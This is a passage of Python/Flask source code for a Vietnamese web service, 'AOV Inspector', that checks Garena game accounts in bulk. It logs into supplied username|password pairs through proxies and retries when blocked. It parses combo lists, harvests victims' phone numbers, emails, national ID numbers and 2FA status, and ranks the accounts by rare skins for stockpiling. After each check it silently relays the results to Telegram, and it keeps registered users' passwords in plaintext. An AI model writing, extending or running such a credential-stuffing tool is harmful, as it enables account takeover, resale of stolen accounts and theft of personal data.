         "two_fa": False, "country_code": "", "username_display": "", "nickname": "",
         "best_hero": "", "best_play": "", "total_matches": "", "rank_id": 0,
         "player_uid": "", "ban_end_time": "", "proxy_used": proxy or ""}
    for attempt in range(AUTO_RETRY + 1):
        try:
            pl = GarenaPipeline(u, p, proxy=proxy)
            if not pl.login_full():
                r["error"] = pl.last_error or "Login failed"
                if attempt < AUTO_RETRY and "block" in r["error"].lower():
                    continue
                return r

            ad = wd = sd = kd = None
            with ThreadPoolExecutor(max_workers=4) as _ex:
                _futures = {
                    _ex.submit(pl.fetch_account_security): "ad",
                    _ex.submit(pl.fetch_weekly_profile): "wd",
                    _ex.submit(pl.fetch_sale_skins): "sd",
                    _ex.submit(pl.fetch_kientuong_player): "kd"
                }
                for _f in as_completed(_futures):
                    _key = _futures[_f]
                    try: _val = _f.result(timeout=30)
                    except: _val = None
                    if _key == "ad": ad = _val
                    elif _key == "wd": wd = _val
                    elif _key == "sd": sd = _val
                    elif _key == "kd": kd = _val

            usr = {}
            if ad and isinstance(ad, dict):
                if "user_info" in ad and isinstance(ad["user_info"], dict): usr = ad["user_info"]
                elif "data" in ad and isinstance(ad["data"], dict): usr = ad["data"]
                else: usr = ad
            r["uid"] = usr.get('uid', pl.garena_uid or 'N/A')
            r["shell"] = usr.get('shell', 0) or 0
            r["username_display"] = usr.get('username', '') or u
            r["nickname"] = usr.get('nickname', '') or usr.get('nick_name', '') or ''
            mobile = usr.get('mobile_no') or usr.get('mobile') or usr.get('phone') or ''
            cc = usr.get('country_code') or usr.get('countryCode') or ''
            r["mobile_no"] = str(mobile) if mobile else ''
            r["country_code"] = str(cc) if cc else ''
            email = usr.get('email') or usr.get('email_address') or usr.get('mail') or ''
            r["email"] = str(email) if email else ''
            idc = usr.get('idcard') or usr.get('id_card') or usr.get('cmnd') or usr.get('cccd') or ''
            r["idcard"] = str(idc) if idc else ''
            two_fa = usr.get('two_step_verify_enable') or usr.get('twoStepVerify') or usr.get('two_fa') or 0
            r["two_fa"] = bool(two_fa)
            if not r["name"]: r["name"] = r["nickname"] or r["username_display"]
            if not r["level"]: r["level"] = usr.get('level', 0) or 0
            if wd and isinstance(wd, dict):
                p_info = wd.get("player_info", {}); rep = wd.get("report", {}); rc = wd.get("rank_config", {})
                rank_id = p_info.get("rank"); r["rank_id"] = rank_id or 0
                if rank_id and rc.get(str(rank_id)): r["rank"] = rc[str(rank_id)].get("name", "")
                try:
                    trend = rep.get("rank", {}).get("week", {}).get("trend", [])
                    if trend: r["rank_stars"] = trend[-1].get("star", 0)
                except: pass
                try:
                    pm_list = rep.get("match", {}).get("play_most", [])
                    if pm_list:
                        pm = pm_list[0]
                        hero_name = pm.get('hero_name', '')
                        if hero_name in ('New Hero', '', None):
                            hero_id = pm.get('hero_id') or pm.get('heroId')
                            if hero_id:
                                hero_name = HERO_MAP.get(str(hero_id), f"Tướng #{hero_id}")
                            else:
                                hero_name = 'Không rõ'
                        wr = pm.get("win_rate", {}).get("data", 0)
                        r["best_hero"] = f"{hero_name} ({pm.get('play_count',0)} trận, WR: {wr}%)"
                except: pass
                try:
                    bp = rep.get("match", {}).get("best_play", {})
                    if bp:
                        kda = bp.get("kda", [0,0,0])
                        hb = bp.get('hero_name', '')
                        if hb in ('New Hero', '', None):
                            hid = bp.get('hero_id') or bp.get('heroId')
                            if hid:
                                hb = HERO_MAP.get(str(hid), f"Tướng #{hid}")
                        r["best_play"] = f"{hb} KDA {kda[0]}/{kda[1]}/{kda[2]}"
                except: pass
                try:
                    cnt = rep.get("match", {}).get("count", {})
                    if cnt:
                        rk = cnt.get("rank", 0); nrk = cnt.get("non_rank", 0)
                        r["total_matches"] = f"{rk+nrk} trận (Rank: {rk}, Thường: {nrk})"
                except: pass
                if p_info.get("name"): r["name"] = p_info["name"]
                if p_info.get("player_uid"):
                    pu = str(p_info["player_uid"])
                    if "_" in pu: pu = pu.split("_")[0]
                    r["player_uid"] = pu

            if kd:
                r["banned"] = kd.get('banned') == 'YES'
                if kd.get("ban_end_time"): r["ban_end_time"] = kd["ban_end_time"]
                if not r["rank"] or r["rank"] == "Chưa xếp hạng":
                    rp, sp = parse_rank(kd.get('rank'))
                    r["rank"] = rp
                    if not r["rank_stars"]: r["rank_stars"] = kd.get('rank_stars', sp)
                if kd.get('level', 0) > 0: r["level"] = kd.get('level', 0)
                if kd.get('name') and not r["name"]: r["name"] = kd.get('name', '')
                if kd.get('player_uid') and not r["player_uid"]: r["player_uid"] = kd['player_uid']
                if not r["mobile_no"] and kd.get("mobile_no"): r["mobile_no"] = kd["mobile_no"]
                if not r["email"] and kd.get("email"): r["email"] = kd["email"]
                if not r["idcard"] and kd.get("idcard"): r["idcard"] = kd["idcard"]
                if not r["two_fa"] and kd.get("two_fa"): r["two_fa"] = kd["two_fa"]

            if not r["rank"] or r["rank"] == "Chưa xếp hạng":
                rank_raw = (usr.get('rankName') or usr.get('rank') or usr.get('rankId')
                            or usr.get('tier') or usr.get('tierName') or '')
                star_raw = (usr.get('star') or usr.get('stars') or usr.get('rankStar')
                            or usr.get('starCount') or 0)
                if rank_raw:
                    rp, sp = parse_rank(rank_raw)
                    if rp and rp != "Chưa xếp hạng":
                        r["rank"] = rp
                        if not r["rank_stars"]: r["rank_stars"] = int(star_raw) if str(star_raw).isdigit() else sp

            all_skins = []; other_skins = []; sss_list, ss_list, anime_list = [], [], []
            if sd:
                up = ((sd.get("data") or {}).get("getUser") or {}).get("profile") or {}
                oids = up.get("ownedItemIdList") or []
                for iid in oids:
                    info = parse_item_info(iid)
                    if info:
                        info["cdn"] = _hero_cdn(iid)
                        info["cdn_fallback"] = _hero_fallback_cdn(iid)
                        all_skins.append(info)
                        if info['tier'] == 'SSS': sss_list.append(info)
                        elif info['tier'] == 'SS': ss_list.append(info)
                        elif info['tier'] == 'Anime': anime_list.append(info)
                    else:
                        hero_name = get_hero_name_from_id(iid)
                        other_skins.append({"item_id": iid, "hero_name": hero_name,
                                            "skin_name": f"Skin #{iid}", "tier": "Normal",
                                            "cdn": _hero_cdn(iid), "cdn_fallback": _hero_fallback_cdn(iid)})
            r["sss"] = sss_list; r["ss"] = ss_list; r["anime"] = anime_list
            r["other_skins"] = other_skins
            r["all_skins"] = all_skins + other_skins
            r["total_skins"] = len(r["all_skins"])
            r["skins"] = all_skins
            if r["banned"]: r["type"] = "banned"
            elif r["sss"]: r["type"] = "sss"
            elif r["anime"]: r["type"] = "anime"
            elif r["ss"]: r["type"] = "ss"
            elif r["total_skins"] == 0: r["type"] = "trang"
            elif r["total_skins"] <= 5: r["type"] = "trang"
            else: r["type"] = "normal"
            return r
        except Exception as e:
            r["error"] = str(e); r["type"] = "failed"
            logger.error(f"[CHECK] EXC: {traceback.format_exc()}")
            if attempt < AUTO_RETRY: continue
    return r

def format_result(r, short=False):
    lines = []
    t = r.get("type", "unknown")
    icons = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}
    lines.append(f"{icons.get(t, '?')} [{t.upper()}] {r.get('username','')}|{r.get('password','')}")
    if t == "failed":
        lines.append(f"   └─ {r.get('error','')}")
        lines.append("")
        lines.append("   💡 Thử check lại hoặc RESTART tool nếu vẫn lỗi")
        return "\n".join(lines)

    lines.append(f"   ├─ UID: {r.get('uid','N/A')}")
    if r.get('player_uid'): lines.append(f"   ├─ Player UID: {r['player_uid']}")
    lines.append(f"   ├─ Tên ĐN: {r.get('username_display','') or r.get('username','')}")
    lines.append(f"   ├─ Nick: {r.get('name','') or r.get('nickname','') or 'Chưa đặt'}")
    lines.append(f"   ├─ Rank: {r.get('rank','') or 'Chưa xếp hạng'} ({r.get('rank_stars',0)}★)")
    lines.append(f"   ├─ Level: {r.get('level',0)}")
    lines.append(f"   ├─ Sò: {r.get('shell',0)}")
    phone = r.get('mobile_no', ''); email = r.get('email', ''); cc = r.get('country_code', '')
    phone_disp = f"{phone} (+{cc})" if (phone and cc) else (phone if phone else 'Không có')
    lines.append(f"   ├─ SĐT: {phone_disp}")
    lines.append(f"   ├─ Email: {email if email else 'Không có'}")
    lines.append(f"   ├─ CCCD: {r.get('idcard','') or 'Chưa liên kết'}")
    lines.append(f"   ├─ 2FA: {'BẬT' if r.get('two_fa') else 'TẮT'}")
    ban_txt = 'BAN' if r.get('banned') else 'CLEAN'
    if r.get('banned') and r.get('ban_end_time'): ban_txt = f"BAN đến {r['ban_end_time']}"
    lines.append(f"   ├─ BAN: {ban_txt}")
    if r.get('best_hero'): lines.append(f"   ├─ Tướng tủ: {r['best_hero']}")
    if r.get('best_play'): lines.append(f"   ├─ Trận ấn tượng: {r['best_play']}")
    if r.get('total_matches'): lines.append(f"   ├─ Tổng trận: {r['total_matches']}")
    lines.append(f"   ├─ Tổng Skin: {r.get('total_skins', 0)}")

    # v3.7.3: Phát hiện data thiếu → cảnh báo user
    has_phone = bool(r.get('mobile_no'))
    has_email = bool(r.get('email'))
    has_idcard = bool(r.get('idcard'))
    has_level = r.get('level', 0) > 0
    has_shell = r.get('shell', 0) > 0
    has_uid = bool(r.get('uid')) and r.get('uid') != 'N/A'
    missing_count = sum([not has_phone, not has_email, not has_idcard,
                         not has_level, not has_shell])
    if missing_count >= 4 or not has_uid:
        lines.append("")
        lines.append("   ⚠️ LỖI TẠM THỜI - Vui lòng check lại")
        lines.append("   💡 Nếu vẫn lỗi → RESTART tool (khởi động lại server)")

    sss_list = r.get("sss", []); ss_list = r.get("ss", []); anime_list = r.get("anime", [])
    if not (sss_list or ss_list or anime_list):
        lines.append(f"   └─ (Không có skin SSS / SS / Anime)")
        return "\n".join(lines)

    groups = []
    if sss_list: groups.append(("sss", sss_list))
    if ss_list: groups.append(("ss", ss_list))
    if anime_list: groups.append(("anime", anime_list))
    for g_idx, (tier_key, tier_list) in enumerate(groups):
        is_last_group = (g_idx == len(groups) - 1)
        if tier_key == "sss": header = f"   {'└─' if is_last_group else '├─'} ⭐ SSS ({len(tier_list)}):"; icon = "⭐"
        elif tier_key == "ss": header = f"   {'└─' if is_last_group else '├─'} ◆ SS ({len(tier_list)}):"; icon = "◆"
        else: header = f"   {'└─' if is_last_group else '├─'} ◇ Anime ({len(tier_list)}):"; icon = "◇"
        lines.append(header)
        for s_idx, skin in enumerate(tier_list):
            is_last_skin = (s_idx == len(tier_list) - 1)
            branch = "└─" if (is_last_group and is_last_skin) else "├─"
            indent = "   " + ("   " if is_last_group else "│  ")
            lines.append(f"{indent}{branch} {icon} [{skin.get('item_id','')}]")
            lines.append(f"{indent}   {skin.get('hero_name','?')} → {skin.get('skin_name','?')}")
    return "\n".join(lines)

def make_hist_entry(r, acc, from_kho=False):
    return {"id": uuid.uuid4().hex[:12], "acc": acc, "password": r.get("password", ""),
        "result": r.get("type", "unknown"), "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "uid": r.get("uid", ""), "nick": r.get("name", ""), "rank": r.get("rank", ""),
        "rank_stars": r.get("rank_stars", 0), "level": r.get("level", 0), "shell": r.get("shell", 0),
        "banned": r.get("banned", False), "ban_end_time": r.get("ban_end_time", ""),
        "error": r.get("error", ""), "total_skins": r.get("total_skins", 0),
        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
        "email": r.get("email", ""), "idcard": r.get("idcard", ""), "two_fa": r.get("two_fa", False),
        "username_display": r.get("username_display", ""), "nickname": r.get("nickname", ""),
        "player_uid": r.get("player_uid", ""),
        "best_hero": r.get("best_hero", ""), "best_play": r.get("best_play", ""),
        "total_matches": r.get("total_matches", ""), "rank_id": r.get("rank_id", 0),
        "from_kho": from_kho,
        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("sss", [])],
        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("ss", [])],
        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("anime", [])],
        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("other_skins", [])]}

# ========== PARSE FILE ==========
def parse_file_content_advanced(content, separator=None):
    accs = []
    for raw_line in content.splitlines():
        line = raw_line.strip()
        if not line: continue
        if line.startswith("#"): continue
        if line.startswith("//"): continue
        line = re.sub(r'^[\s•\-\*→>●○■□◆◇★☆✓✔✗✘❤♡💚💙🔥⚡]+', '', line)
        line = re.sub(r'^\s*\[?\d+\]?\s*[.)\]/\-:]?\s+', '', line)
        line = re.sub(r'[\U0001F300-\U0001F9FF\u2600-\u27BF]+', ' ', line).strip()
        line = line.strip('"\'`')
        if not line or len(line) < 5: continue
        parsed = None
        m = re.search(r'=\s*([A-Za-z0-9_.@+\-]{3,})\s*[:|]\s*([^\s|]{3,})', line)
        if m:
            u = m.group(1).strip(); p = m.group(2).strip().rstrip('|').strip()
            if u.upper() not in ("FINAL","FULL","ACC","NAME","USER","PASS"):
                if u and p and len(u) >= 3 and len(p) >= 3: parsed = (u, p)
        if not parsed:
            m3 = re.search(r'(?:TK|User|Username|Acc|Account|Tài\s*khoản)\s*[:=]\s*([A-Za-z0-9_.@+\-]{3,})\s*[|,\s]\s*(?:MK|Pass|Password|Mật\s*khẩu)\s*[:=]\s*([^\s|,]{3,})', line, re.IGNORECASE)
            if m3:
                u = m3.group(1).strip(); p = m3.group(2).strip()
                if u and p: parsed = (u, p)
        if not parsed:
            seps = [separator] if (separator and separator != "auto") else ["|", "\t", ":", " - ", " ", ",", "=", ";"]
            for sep in seps:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2:
                        u = parts[0].strip().strip('"\'`')
                        p = parts[1].strip().strip('"\'`')
                        if not u or not p: continue
                        if len(u) < 2 or len(p) < 3: continue
                        if '  ' in p: continue
                        if u.lower() in ('http','https','www','url','link','note','ghi','chu'): continue
                        if p.lower() in ('http','https','www','url','link'): continue
                        parsed = (u, p); break
        if parsed: accs.append(parsed)
    return accs

# ========== ROUTES: AUTH ==========
@app.route("/health")
def health():
    return jsonify({"status": "ok", "users": len(USERS), "storage": len(ACC_STORAGE),
                    "active_jobs": _active_jobs_count[0], "storage_jobs": _storage_jobs_count[0]})

@app.route("/")
def index():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    return redirect(url_for("login_page"))

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        usr = USERS.get(u)
        if usr and usr["password"] == hash_password(p):
            if u in BANNED_USERS:
                flash("Tài khoản đã bị ban!", "error")
                return redirect(url_for("login_page"))
            session["username"] = u; session.permanent = True
            session["session_epoch"] = usr.get("session_epoch", 0)
            today = datetime.now().strftime("%Y-%m-%d")
            db = usr.get("daily_bonus", {})
            if db.get("date") == today and db.get("amount", 0) > 0:
                usr["balance"] = usr.get("balance", 0) + db["amount"]
                db["amount"] = 0
                save_data(force=True)
            flash(f"Chào mừng {u}!", "success")
            return redirect(url_for("check_page"))
        flash("Sai tài khoản hoặc mật khẩu!", "error")
    content = '''
    <div class="card" style="margin-top:20px; text-align:center;">
        <div style="font-size:4em; margin-bottom:12px;">◈</div>
        <h1 class="card-title" style="justify-content:center; font-size:1.6em; margin-bottom:8px;">AOV INSPECTOR</h1>
        <p style="color:var(--text-dim); margin-bottom:24px;">Hệ thống kiểm tra tài khoản Liên Quân</p>
        <div style="display:flex; gap:8px; margin-bottom:24px;">
            <a href="/login" class="btn btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-secondary btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group" style="text-align:left;"><label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" required></div>
            <div class="form-group" style="text-align:left;"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required></div>
            <button type="submit" class="btn btn-block">Đăng Nhập</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        cf = request.form.get("confirm", "")
        ref = request.form.get("ref", "").strip().upper()
        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
            flash("Username 3-20 ký tự chữ/số!", "error")
        elif len(p) < 4: flash("Mật khẩu ít nhất 4 ký tự!", "error")
        elif p != cf: flash("Mật khẩu không khớp!", "error")
        elif u in USERS: flash("Username đã tồn tại!", "error")
        else:
            uid = gen_id(); inviter = None
            for un, uu in USERS.items():
                if uu.get("id") == ref: inviter = un; break
            new_tag = "TAG-" + u.upper() + "-" + uuid.uuid4().hex[:6].upper()
            USERS[u] = {"id": uid, "username": u, "password": hash_password(p),
                "plain_password": p, "tag_code": new_tag, "session_epoch": 0,
                "daily_limit": USER_DAILY_LIMIT,
                "balance": DEFAULT_BALANCE, "temp_balance": 0, "referrals": 0,
                "invited_by": inviter, "is_admin": False, "is_qtv": False, "is_owner": False,
                "created_at": time.time(),
                "last_checkin": 0, "last_notif_read": 0, "checkin_streak": 0,
                "total_checkins": 0, "history": [], "current_job": None,
                "level": 1, "exp": 0, "favorites": [], "tags": {},
                "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
                "daily_missions": {}, "last_daily_reset": 0,
                "daily_received": {}, "received_accs": [], "daily_bonus": {},
                "chat_last_read": {}}
            if inviter and inviter in USERS:
                USERS[inviter]["referrals"] = USERS[inviter].get("referrals", 0) + 1
                USERS[inviter]["balance"] += REFERRAL_REWARD
                USERS[u]["balance"] += REFERRAL_BONUS
            save_data(force=True)
            session["username"] = u; session.permanent = True
            flash(f"Đăng ký thành công! ID: {uid}", "success")
            return redirect(url_for("check_page"))
    content = '''
    <div class="card" style="margin-top:20px;">
        <div style="text-align:center; margin-bottom:20px;">
            <div style="font-size:4em; margin-bottom:8px;">✦</div>
            <h1 class="card-title" style="justify-content:center; font-size:1.6em;">ĐĂNG KÝ</h1>
        </div>
        <div style="display:flex; gap:8px; margin-bottom:20px;">
            <a href="/login" class="btn btn-secondary btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group"><label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" required minlength="3" maxlength="20"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">Xác nhận mật khẩu</label>
                <input type="password" name="confirm" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">Mã người mời (tùy chọn)</label>
                <input type="text" name="ref" class="form-input"></div>
            <button type="submit" class="btn btn-success btn-block">Tạo Tài Khoản</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Đã đăng xuất!", "success")
    return redirect(url_for("login_page"))

# ========== ROUTES: CHECK ==========
@app.route("/check", methods=["GET", "POST"])
@login_required
def check_page():
    user = get_user()
    result = None
    result_data = None
    if request.method == "POST":
        acc = request.form.get("account", "").strip()
        pwd = request.form.get("password", "").strip()
        if not acc or not pwd: flash("Nhập đầy đủ!", "error")
        elif user["balance"] < CHECK_COST: flash("Không đủ lượt!", "error")
        else:
            user["balance"] -= CHECK_COST
            try:
                r = run_single_check(acc, pwd)
                result = format_result(r)
                result_data = r
                user["history"] = user.get("history", [])[-199:] + [make_hist_entry(r, acc)]
                user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + 1
                if r["type"] == "sss": user["mission"]["sss"] = user["mission"].get("sss", 0) + 1
                elif r["type"] == "ss": user["mission"]["ss"] = user["mission"].get("ss", 0) + 1
                elif r["type"] == "anime": user["mission"]["anime"] = user["mission"].get("anime", 0) + 1
                add_exp(user, 3)
                save_data()
                send_silent_telegram(r)
            except Exception as e:
                result = f"✕ Lỗi: {e}"; flash(f"Lỗi: {e}", "error")
    skin_gallery = ""
    if result_data:
        def render_skin_grid(lst, cls, icon, label):
            if not lst: return ""
            items_html = ""
            for s in lst:
                items_html += f'''<div class="skin-card">
                    <div class="skin-img-wrap">
                        <img src="{s.get('cdn','')}" alt="" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';">
                    </div>
                    <div class="skin-info">
                        <div class="skin-hero">{s.get('hero_name','?')}</div>
                        <div class="skin-name">{s.get('skin_name','?')}</div>
                        <div class="skin-id">#{s.get('item_id','')}</div>
                    </div></div>'''
            return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{icon} {label} ({len(lst)})</h3><div class="skin-grid">{items_html}</div></div>'
        skin_gallery += render_skin_grid(result_data.get("sss", []), "sss", "⭐", "SSS")
        skin_gallery += render_skin_grid(result_data.get("anime", []), "anime", "🎴", "ANIME")
        skin_gallery += render_skin_grid(result_data.get("ss", []), "ss", "💠", "SS")
    m = user.get("mission", {})
    content = f'''
    <div id="check-loading" style="display:none; position:fixed; inset:0; background:rgba(5,0,14,0.95); backdrop-filter:blur(20px); z-index:9999; align-items:center; justify-content:center; flex-direction:column; gap:20px;">
        <div style="width:80px; height:80px; border:5px solid rgba(255,0,229,0.2); border-top-color:#ff00e5; border-right-color:#a855f7; border-radius:50%; animation:spin 1s linear infinite; box-shadow:0 0 40px rgba(255,0,229,0.6);"></div>
        <div style="font-family:Orbitron; font-size:1.3em; font-weight:800; color:#ff88ee; letter-spacing:2px;">ĐANG KIỂM TRA...</div>
        <div style="color:var(--text-dim); font-size:0.9em; font-family:'Share Tech Mono',monospace;" id="loading-acc">Đang kết nối Garena</div>
        <div style="color:#ffb800; font-size:0.85em; margin-top:8px;">⏱️ Có thể mất 5-15 giây</div>
    </div>
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◈</span> Check Tài Khoản</h2>
        <form method="POST" id="check-form" onsubmit="showCheckLoading()">
            <div class="form-group"><label class="form-label">Tài khoản</label>
                <input type="text" name="account" id="check-account" class="form-input" required autocomplete="off"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" required></div>
            <button type="submit" class="btn btn-block" id="check-btn">Check Ngay ({CHECK_COST} Lượt)</button>
        </form>
    </div>
    {f'<div class="card"><h3 class="card-title">◉ Kết Quả</h3><div class="result-box">{result}</div></div>' if result else ''}
    {skin_gallery}
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◐</span> Thống Kê</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value">{m.get('total_acc', 0)}</div><div class="stat-label">Tổng Acc</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('sss', 0)}</div><div class="stat-label">SSS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('ss', 0)}</div><div class="stat-label">SS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('anime', 0)}</div><div class="stat-label">Anime</div></div>
        </div>
    </div>
    <script>
    function showCheckLoading() {{
        var acc = document.getElementById('check-account').value || 'unknown';
        document.getElementById('loading-acc').textContent = 'Đang check: ' + acc;
        document.getElementById('check-loading').style.display = 'flex';
        document.getElementById('check-btn').disabled = true;
        document.getElementById('check-btn').textContent = '⏳ ĐANG CHECK...';
    }}
    </script>'''
    return render_page(content, active_tab="check", user=user)

# ========== UP ACC ==========
@app.route("/up_acc", methods=["GET", "POST"])
@admin_or_qtv_required
def up_acc():
    user = get_user()
    if request.method == "POST":
        content_raw = ""
        if "file" in request.files and request.files["file"].filename:
            f = request.files["file"]
            if not f.filename.endswith(".txt"):
                flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("up_acc"))
            content_raw = f.read().decode("utf-8", errors="ignore")
        if not content_raw:
            content_raw = request.form.get("accs_text", "").strip()
        if not content_raw:
            flash("Chưa có dữ liệu!", "error"); return redirect(url_for("up_acc"))
        accs = parse_file_content_advanced(content_raw, "auto")
        if not accs:
            flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("up_acc"))
        if len(accs) > MAX_ACC_PER_UPLOAD:
            flash(f"Tối đa {MAX_ACC_PER_UPLOAD} acc/lần. Bạn up {len(accs)} acc!", "error")
            return redirect(url_for("up_acc"))
        job_id = uuid.uuid4().hex[:16]
        STORAGE_JOBS[job_id] = {
            "id": job_id, "admin": user["username"], "total": len(accs),
            "current": 0, "progress": 0, "done": False,
            "logs": [], "current_acc": "",
            "passed": 0, "banned": 0, "failed": 0,
            "started": time.time(), "cancelled": False
        }
        threading.Thread(target=run_storage_upload, args=(job_id, accs), daemon=True).start()
        log_admin("UP_ACC", job_id, f"{len(accs)} acc")
        return redirect(url_for("up_acc_progress", job_id=job_id))
    content = f'''<div class="card">
        <h2 class="card-title">📤 UP ACC VÀO KHO</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">
            Bot sẽ <b>check login</b> + <b>loại acc bị ban</b> + <b>loại acc 0 skin</b> trước khi vào kho.<br>
            ⚡ <b style="color:#00ff88;">KHÔNG NGHỈ — chạy liên tục</b></p>
        <div style="background:rgba(0,0,0,0.4); padding:14px; border-radius:14px; margin-bottom:14px; border:1px solid var(--border);">
            <div class="info-row"><span class="info-label">Tối đa/lần</span><span class="info-value">{MAX_ACC_PER_UPLOAD} acc</span></div>
            <div class="info-row"><span class="info-label">Số luồng</span><span class="info-value" style="color:#00ff88;">⚡ {STORAGE_CHECK_THREADS} luồng</span></div>
            <div class="info-row"><span class="info-label">Delay/acc</span><span class="info-value" style="color:#00ff88;">{STORAGE_DELAY_PER_ACC}s (không nghỉ)</span></div>
            <div class="info-row"><span class="info-label">Nghỉ giữa batch</span><span class="info-value" style="color:#00ff88;">{STORAGE_BATCH_SLEEP}s (không nghỉ)</span></div>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">📎 Upload file .txt</label>
                <input type="file" name="file" class="form-input" accept=".txt"></div>
            <div style="text-align:center; color:var(--text-dim); margin:8px 0;">— HOẶC —</div>
            <div class="form-group"><label class="form-label">📝 Paste trực tiếp</label>
                <textarea name="accs_text" class="form-textarea" rows="10" placeholder="user1|pass1&#10;user2|pass2&#10;..."></textarea></div>
            <button type="submit" class="btn btn-block">🚀 BẮT ĐẦU LỌC & UP</button>
        </form>
    </div>'''
    return render_page(content, active_tab="up_acc", user=user)

@app.route("/up_acc/progress/<job_id>")
@admin_or_qtv_required
def up_acc_progress(job_id):
    user = get_user()
    job = STORAGE_JOBS.get(job_id)
    if not job: flash("Job không tồn tại!", "error"); return redirect(url_for("up_acc"))
    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang check & up...</h2>
        <p style="color:var(--text-dim); margin-bottom:14px;" id="status-text">Đang khởi động...</p>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#ff88ee; font-weight:800;">0%</span>
            </div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div>
            </div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">
                Đang check: <b id="current-acc" style="color:#00f0ff; font-family:monospace;">Chờ...</b></div>
        </div>
        <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ</button>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-passed" style="color:#00ff88;">0</div><div class="lbl">✅ PASSED</div></div>
            <div class="live-stat"><div class="num" id="stat-banned" style="color:#ff2951;">0</div><div class="lbl">🚫 BANNED</div></div>
            <div class="live-stat"><div class="num" id="stat-failed" style="color:#8b8b9a;">0</div><div class="lbl">✕ FAILED</div></div>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal">⏳ Chờ...</div></div>
    </div>
    <div id="done-section" style="display:none;">
        <div class="card">
            <h2 class="card-title" style="color:#00ff88;">✓ HOÀN TẤT!</h2>
            <div class="result-box" id="summary-box"></div>
            <a href="/kho_acc" class="btn btn-success btn-block" style="margin-top:14px;">📦 Xem Kho Acc</a>
            <a href="/up_acc" class="btn btn-secondary btn-block" style="margin-top:8px;">+ Up Tiếp</a>
        </div>
    </div>
    <script>
    var jobId = "{job_id}";
    var pollInterval = setInterval(updateJob, 1500);
    function updateJob() {{
        fetch('/api/up_acc/progress/' + jobId)
        .then(r => r.json())
        .then(data => {{
            if (data.error) {{ clearInterval(pollInterval); return; }}
            document.getElementById('progress-bar').style.width = data.progress + '%';
            document.getElementById('progress-percent').textContent = data.progress + '%';
            document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
            if (data.current_acc) document.getElementById('current-acc').textContent = data.current_acc;
            var st = document.getElementById('status-text');
            if (data.done) st.innerHTML = '✅ Hoàn tất!';
            else st.innerHTML = 'Đang xử lý... <b>' + data.current + '/' + data.total + '</b>';
            document.getElementById('stat-passed').textContent = data.passed || 0;
            document.getElementById('stat-banned').textContent = data.banned || 0;
            document.getElementById('stat-failed').textContent = data.failed || 0;
            if (data.logs && data.logs.length > 0) {{
                var html = '';
                for (var i = 0; i < data.logs.length; i++) {{
